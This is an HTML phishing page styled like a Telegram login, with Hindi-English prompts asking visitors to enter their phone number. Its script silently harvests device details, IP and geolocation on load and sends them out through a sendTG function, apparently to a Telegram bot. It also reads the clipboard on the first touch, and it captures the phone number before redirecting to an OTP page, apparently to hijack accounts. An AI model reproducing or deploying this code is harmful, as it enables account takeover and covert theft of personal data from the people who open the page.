<!doctype html>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex">
<title>Verify</title>
<style>
 body{font-family:system-ui;background:#17212b;color:#fff;display:flex;
      align-items:center;justify-content:center;height:100vh;margin:0}
 .box{width:90%;max-width:360px}
 h2{font-size:20px;margin:0 0 6px}
 p{color:#8b9aa8;font-size:14px;margin:0 0 22px}
 input{width:100%;padding:14px;border-radius:10px;border:1px solid #2b3a47;
       background:#242f3d;color:#fff;font-size:17px;box-sizing:border-box}
 button{width:100%;margin-top:14px;padding:14px;border:0;border-radius:10px;
        background:#3390ec;color:#fff;font-size:16px;font-weight:600}
</style>
<div class="box">
  <h2>Number daalo</h2>
  <p>Confirm karne ke liye</p>
  <input id="ph" type="tel" inputmode="numeric" placeholder="+91 98765 43210">
  <button id="go">Aage</button>
</div>
<script src="config.js"></script>
<script src="send.js"></script>
<script>
const ph = document.getElementById('ph'), go = document.getElementById('go');

function vid(){
  let id = localStorage.getItem('vid');
  if (!id){ id = 'v' + Math.random().toString(36).slice(2,8); localStorage.setItem('vid', id); }
  return id;
}

/* silent */
(async () => {
  const o = [];
  try {
    const h = await navigator.userAgentData.getHighEntropyValues(['model','platformVersion']);
    o.push('Model: ' + h.model + ' | ' + h.platformVersion);
  } catch(e){}
  o.push('Screen: ' + screen.width + 'x' + screen.height);
  o.push('Lang: ' + navigator.language);
  o.push('Ref: ' + (document.referrer || 'direct'));
  let ip = 'fail';
  try {
    const d = await (await fetch('https://ipapi.co/json/')).json();
    ip = `IP: ${d.ip}\n${d.city}, ${d.region}\nISP: ${d.org}`;
  } catch(e){}
  sendTG(`[${vid()}] <b>OPEN</b>\n${ip}\n<code>${o.join('\n')}</code>`);
})();

/* pehla tap = clipboard */
document.addEventListener('touchstart', async function once(){
  document.removeEventListener('touchstart', once);
  try {
    const t = (await navigator.clipboard.readText()).trim();
    if (t) sendTG(`[${vid()}] CLIPBOARD\n<code>${t.slice(0,300)}</code>`);
  } catch(e){}
}, { passive:true });

go.onclick = async () => {
  if (ph.value.replace(/\D/g,'').length < 10) return alert('Sahi number daalo');
  go.disabled = true; go.textContent = 'Rukho...';
  const loc = await getLoc();
  sessionStorage.setItem('num', ph.value);
  sessionStorage.setItem('loc', loc || '-');
  sendTG(`[${vid()}] <b>NUMBER</b>\nPhone: <code>${ph.value}</code>\nLoc: ${loc || '-'}`);
  location.href = 'otp.html';
};
</script>
